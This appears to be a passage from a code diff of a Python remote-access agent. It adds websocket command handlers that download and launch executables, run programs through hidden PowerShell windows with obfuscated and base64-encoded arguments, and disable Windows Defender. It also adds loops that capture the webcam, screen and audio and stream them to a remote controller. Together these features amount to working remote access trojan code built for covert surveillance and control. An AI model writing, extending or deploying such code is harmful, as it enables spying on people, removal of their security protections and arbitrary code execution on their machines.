+                                        )
+                                        return f"[OK] Launched: {filename} ({dest})\n"
+
+                                try:
+                                    out = await asyncio.to_thread(_dl_run_sync)
+                                    d = {"cmd": CMD_DL_EXE, "data": {"out": out}}
+                                    await send_ws(json.dumps(d))
+                                except subprocess.TimeoutExpired:
+                                    await send_ws(json.dumps({"cmd": CMD_DL_EXE, "data": {"out": "(error) Command timed out (120s)\n"}}))
+                                except Exception as ex:
+                                    _log(f"CMD_DL_EXE: {ex}")
+                                    await send_ws(json.dumps({"cmd": CMD_DL_EXE, "data": {"out": f"(error) {ex}\n"}}))
+                            elif cmd == CMD_RUN_EXE:
+                                path = a.get("path", "")
+                                args = a.get("args", "")
+                                show_in_terminal = a.get("terminal", False)
+                                if show_in_terminal:
+                                    ps_cmd = f'Start-Process -FilePath "{path}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit 0"}}else{{echo "[FAIL] Exit $LASTEXITCODE"}}'
+                                    b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
+                                    def _run_term():
+                                        p = subprocess.Popen(
+                                            ["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64],
+                                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                            text=True, encoding="utf-8", errors="replace",
+                                            creationflags=0x08000000,
+                                        )
+                                        return p.communicate(timeout=120)[0] or ""
+                                    out = await asyncio.to_thread(_run_term)
+                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": out, "shellId": "side"}}))
+                                else:
+                                    subprocess.Popen(f'"{path}" {args}'.strip(), shell=True, creationflags=0x08000000)
+                            elif cmd == CMD_DISABLE_DEFENDER:
+                                def _defender_sync():
+                                    return _disable_defender()
+                                out = await asyncio.to_thread(_defender_sync)
+                                await send_ws(
+                                    json.dumps({"cmd": CMD_SHELL, "data": {"out": out + "\n", "shellId": "side"}})
                                 )
-                                return img.bgra, b"\x01" + buf.getvalue()
+                            elif cmd == CMD_PING:
+                                pass
+                        except ConnectionClosed:
+                            raise
+                        except Exception as ex:
+                            _log(f"CMD {hex(cmd) if cmd else '?'} err: {ex}")
 
-                        def _adjust_quality(elapsed):
-                            nonlocal quality, _quiet_quality, frame_interval, quality_adj_ticks
-                            send_times.append(elapsed)
-                            if len(send_times) > 10:
-                                send_times.pop(0)
-                            quality_adj_ticks += 1
-                            if quality_adj_ticks >= 15:
-                                quality_adj_ticks = 0
-                                avg = sum(send_times) / len(send_times)
-                                if avg > 0.25 and quality > min_quality:
-                                    quality = max(min_quality, quality - 8)
-                                elif avg < 0.06 and quality < max_quality:
-                                    quality = min(max_quality, quality + 4)
-                                frame_interval = max(min_interval, min(max_interval, avg * 1.5))
-                                _quiet_quality = quality
+                async def camera_loop():
+                    """Single capture + encode path: stable LED, lower lag, no dual OpenCV grab."""
+                    target_dt = 1.0 / 28.0
+                    idle_ticks = 0
+                    while True:
+                        t0 = time.perf_counter()
+                        try:
+                            if not _camera_needed():
+                                idle_ticks += 1
+                                if idle_ticks >= 6:
+                                    async with _camera_lock:
+                                        _close_camera()
+                                    idle_ticks = 0
+                                await asyncio.sleep(0.08)
+                                continue
+                            idle_ticks = 0
+                            async with _camera_lock:
+                                cap = _open_camera()
+                                if cap is None:
+                                    await asyncio.sleep(0.06)
+                                    continue
+                                ret, frame = cap.read()
+                            if not ret:
+                                await asyncio.sleep(0.02)
+                                continue
+                            import cv2
+                            _, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
+                            blob = b"\x01" + jpg.tobytes()
+                            if _view_mode == "cam":
+                                await send_stream(blob)
+                            if _cam_stream_enabled:
+                                await send_cam(blob)
+                        except ConnectionClosed:
+                            raise
+                        except Exception as ex:
+                            _log(f"camera_loop: {ex}")
+                        elapsed = time.perf_counter() - t0
+                        await asyncio.sleep(max(0.0, target_dt - elapsed))
 
-                        while True:
-                            try:
-                                if _view_mode == "screen":
-                                    _hid_now = time.time() - _last_hid_time < 0.5
-                                    if _hid_now:
-                                        quality = 15
-                                        frame_interval = max(frame_interval, 0.12)
-                                    else:
-                                        quality = _quiet_quality
+                async def stream_loop():
+                    """MJPEG + frame diff: skip encode/send when screen unchanged."""
+                    quality = 48
+                    _quiet_quality = 48
+                    min_quality = 15
+                    max_quality = 85
+                    frame_interval = 0.048
+                    min_interval = 0.020
+                    max_interval = 0.250
+                    send_times = []
+                    quality_adj_ticks = 0
+                    _prev_frame_hash = None
+                    import hashlib
 
-                                    t0 = time.perf_counter()
-                                    raw_bgra, blob = await asyncio.to_thread(_grab_screen_jpeg, quality)
-                                    cur_hash = hashlib.md5(raw_bgra).digest()
-                                    if _prev_frame_hash is not None and cur_hash == _prev_frame_hash:
-                                        elapsed = time.perf_counter() - t0
-                                        _adjust_quality(elapsed)
-                                    else:
-                                        await send_stream(blob)
-                                        elapsed = time.perf_counter() - t0
-                                        _adjust_quality(elapsed)
-                                    _prev_frame_hash = cur_hash
+                    def _grab_screen_jpeg(q):
+                        with mss.mss() as sx:
+                            img = sx.grab(sx.monitors[0])
+                            buf = BytesIO()
+                            Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(
+                                buf, format="JPEG", quality=q, optimize=True
+                            )
+                            return img.bgra, b"\x01" + buf.getvalue()
 
-                                if _audio_enabled:
-                                    pkt = _audio_try_pop()
-                                    if pkt:
-                                        await send_stream(pkt)
-                                        if _cam_stream_enabled:
-                                            await send_cam(pkt)
-                            except ConnectionClosed:
-                                raise
-                            except (BrokenPipeError, ConnectionResetError, OSError) as ex:
-                                _log(f"Stream loop socket error: {ex}")
-                                raise
-                            except Exception as ex:
-                                _log(f"Stream loop error: {ex}")
+                    def _adjust_quality(elapsed):
+                        nonlocal quality, _quiet_quality, frame_interval, quality_adj_ticks
+                        send_times.append(elapsed)
+                        if len(send_times) > 10:
+                            send_times.pop(0)
+                        quality_adj_ticks += 1
+                        if quality_adj_ticks >= 15:
+                            quality_adj_ticks = 0
+                            avg = sum(send_times) / len(send_times)
+                            if avg > 0.25 and quality > min_quality:
+                                quality = max(min_quality, quality - 8)
+                            elif avg < 0.06 and quality < max_quality:
+                                quality = min(max_quality, quality + 4)
+                            frame_interval = max(min_interval, min(max_interval, avg * 1.5))
+                            _quiet_quality = quality
+
+                    while True:
+                        try:
+                            if _view_mode == "screen":
+                                _hid_now = time.time() - _last_hid_time < 0.5
+                                if _hid_now:
+                                    quality = 15
+                                    frame_interval = max(frame_interval, 0.12)
+                                else:
+                                    quality = _quiet_quality
+
+                                t0 = time.perf_counter()
+                                raw_bgra, blob = await asyncio.to_thread(_grab_screen_jpeg, quality)
+                                cur_hash = hashlib.md5(raw_bgra).digest()
+                                if _prev_frame_hash is not None and cur_hash == _prev_frame_hash:
+                                    elapsed = time.perf_counter() - t0
+                                    _adjust_quality(elapsed)
+                                else:
+                                    await send_stream(blob)
+                                    elapsed = time.perf_counter() - t0
+                                    _adjust_quality(elapsed)
+                                _prev_frame_hash = cur_hash
+
                             if _audio_enabled:
-                                await asyncio.sleep(0.014)
-                            else:
-                                await asyncio.sleep(max(0.014, frame_interval if _view_mode == "screen" else 0.02))
+                                pkt = _audio_try_pop()
+                                if pkt:
+                                    await send_stream(pkt)
+                                    if _cam_stream_enabled:
+                                        await send_cam(pkt)
+                        except ConnectionClosed:
+                            raise
+                        except (BrokenPipeError, ConnectionResetError, OSError) as ex:
+                            _log(f"Stream loop socket error: {ex}")
+                            raise
+                        except Exception as ex:
+                            _log(f"Stream loop error: {ex}")
+                        if _audio_enabled:
+                            await asyncio.sleep(0.014)
+                        else:
+                            await asyncio.sleep(max(0.014, frame_interval if _view_mode == "screen" else 0.02))
 
-                    recv_t = asyncio.create_task(recv_loop())
-                    stream_t = asyncio.create_task(stream_loop())
-                    cam_t = asyncio.create_task(camera_loop())
-                    ping_t = asyncio.create_task(agent_keepalive())
-                    tasks = {recv_t, stream_t, cam_t, ping_t}
-                    try:
-                        done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-                        exc_to_raise = None
-                        for t in done:
-                            if not t.cancelled():
-                                ex = t.exception()
-                                if ex is not None:
-                                    exc_to_raise = ex
-                        for p in pending:
-                            p.cancel()
-                        if pending:
-                            await asyncio.gather(*pending, return_exceptions=True)
-                        if exc_to_raise is not None:
-                            raise exc_to_raise
-                    finally:
-                        for t in tasks:
-                            if not t.done():
-                                t.cancel()
-                        await asyncio.gather(*tasks, return_exceptions=True)
+                recv_t = asyncio.create_task(recv_loop())
+                stream_t = asyncio.create_task(stream_loop())
+                cam_t = asyncio.create_task(camera_loop())
+                ping_t = asyncio.create_task(agent_keepalive())
+                tasks = {recv_t, stream_t, cam_t, ping_t}
+                try:
+                    done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+                    exc_to_raise = None
+                    for t in done:
+                        if not t.cancelled():
+                            ex = t.exception()
+                            if ex is not None:
+                                exc_to_raise = ex
+                    for p in pending:
+                        p.cancel()
+                    if pending:
+                        await asyncio.gather(*pending, return_exceptions=True)
+                    if exc_to_raise is not None:
+                        raise exc_to_raise
+                finally:
+                    for t in tasks:
+                        if not t.done():
+                            t.cancel()
+                    await asyncio.gather(*tasks, return_exceptions=True)
         except KeyboardInterrupt:
             raise
         except ExceptionGroup as eg:
